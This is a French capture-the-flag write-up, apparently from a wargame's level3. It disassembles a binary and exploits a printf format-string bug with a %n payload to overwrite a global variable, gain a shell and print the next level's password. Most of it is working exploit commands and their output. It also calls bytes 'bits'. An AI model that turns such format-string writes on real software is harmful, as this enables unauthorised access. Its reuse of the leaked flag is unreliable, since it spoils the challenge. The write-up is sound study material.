```
objdump -M intel -d level3
```

Nous observons que la fonction main appelle une fonction "v".
Qui elle même appelle printf, qui peut être exploitée.

```
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```
Le printf print la string rentré en argument rentrée par fgets fgets() (printf(eax)).

```
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
```
Ici c'est interessant, nous faisons une comparaison et si la comparaison est fausse on part à l'adresse de sortie 0x8048518.
L'objectif est de rendre cette comparaison vrai.
Pour le faire nous changerons la valeur de cette adresse 0x804988c en utilisant printf.

Trouvons notre offset, nous chercherons la valeur ascii de "a" soit 61:
```
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
```
M doit faire 64 bits donc nous ajouterons 60 bits de padding

adresse : \x8c\x98\x04\x08" ==  (  0x080484da <+54>:	mov    0x804988c,%eax) -> adresse Pointeur 
padding:  "a" * 60 64 - 4 == 60 
modification : %4\$n  -> nbre de caractere ecrit (64)


```
python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit
cat /tmp/exploit - | ./level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
